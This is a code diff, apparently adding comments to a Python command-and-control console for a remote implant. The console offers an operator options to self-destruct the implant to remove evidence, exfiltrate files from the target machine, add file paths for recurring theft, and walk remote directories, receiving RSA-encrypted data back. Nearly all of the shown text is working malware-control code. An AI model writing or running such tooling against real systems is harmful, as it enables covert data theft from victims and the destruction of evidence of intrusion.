@@ -58,20 +58,25 @@ def send_implant(comm):
     implant_socket.close()
 
 while(True):
+    #Options Menu
     print("Options:")
     print("1. Self-destruct (clears implant and removes all evidence)")
     print("2. Exfil data")
     print("3. Exit")
     print(f"{Fore.CYAN}What would you like to do:")
     choice = input(">>").lower()
+    #Self-destruct option
     if choice == '1':
+        #Have user confirm that they actually know what they are doing by solving a logic puzzle
         print("Are you sure you want to self-destruct? This action cannot be undone. Enter 'y/n'")
         c1 = input(">>").lower()
         if(c1 == 'y'):
+            #Answer is seven or 7
             print("Answer this puzzle to self-destruct: I am an odd number, but take away one letter and I am 'even'")
             c2 = input(">>").lower()
             if(c2 == '7' or c == 'seven'):
                 print(f"{Fore.RED}Self-destruct initiated")
+                #Send signal to self destruct
                 send_implant('1')
                 print(f"{Fore.RED}Self-destruct complete")
                 exit()
@@ -80,23 +85,30 @@ while(True):
         else:
             print("Aborting self-destruct")
 
+    #Options to exfil useful data
     elif choice == '2':       
-        #Listen for the Responses
+        #Say that we are listening for responses
         c2_socket.listen(1)
         while(True):
+            #Options for Exfil
             print("Press 'n' to end, 'a' to add an exfil path, 'w' to do an oswalk, any other key to continue")
             c = input(">>").lower()
+            #End the loop and go back to main options menu
             if(c == 'n'):
                 break
+            #Option to add another path to the exfil file so that we exfil that every time
             elif(c == 'a'):
                 print("Enter the absolute path to the file to add")
                 path = input(">>")
                 send_implant('2a' + ";" + path)
+            #Option to explore the target directory like an ls command so we can find more files to extract
             elif(c == 'w'):
                 print("Enter the absolute path to the directory to walk")
                 directory = input(">>")
+                #send command, directory, public key
                 send_implant('2w' + ';' + directory + ';' + str(pubkey.n) + ';' + str(pubkey.e))
                 recieve_exfil()
+            #Default option to just extract all the files
             else:
                 print("Exfil initiated")
                 #Send command to exfiltrate
@@ -106,12 +118,13 @@ while(True):
                 #Recieve the exfil and decrypt the response
                 recieve_exfil()
             
-            
+    #Simple option to just quit the C2, but leave the implant running
     elif choice == '3' or choice == 'q' or choice == 'exit' or choice == 'quit':
         print("Exiting the C2 instance")
         print("Implant is still running - Connect to it again later")
         exit()
 
+    #Any other input
     else:
         print("Unrecognized input")
 
